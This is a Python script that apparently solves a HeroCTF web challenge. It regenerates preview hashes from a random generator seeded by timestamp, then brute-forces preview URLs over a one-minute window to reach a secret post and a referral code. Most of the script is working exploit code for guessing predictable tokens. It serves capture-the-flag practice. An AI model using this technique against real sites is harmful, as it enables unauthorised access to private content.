from datetime import datetime
from random import seed, randbytes

import requests


HOST = "http://dyn-06.heroctf.fr:14722"

def generate_hash(timestamp=None):
    """Generate hash for post preview."""
    if timestamp:
        seed(timestamp)
    else:
        seed(int(datetime.now().timestamp()))

    return randbytes(32).hex()


"""
Admin page: http://dyn-03.heroctf.fr:10065/author/17

Secret post!!
Posted by on 2023-05-13 02:53
"""
dt = datetime(year=2023, month=5,
        day=13, hour=2, minute=53, second=0)

timestamp = int(dt.timestamp()) + 2 * 3600 # UTC+2 !
for ts in range(timestamp, timestamp + 60):
    preview_hash = generate_hash(timestamp=ts)
    # print(preview_hash)
    resp = requests.get(HOST + "/post/preview/" + preview_hash)
    if "Report a post" in resp.text:
        print(preview_hash)
        print(resp.text)

"""
Here is the referral code: 83d99a0ac225079db31b44a2e58b19f0.
"""
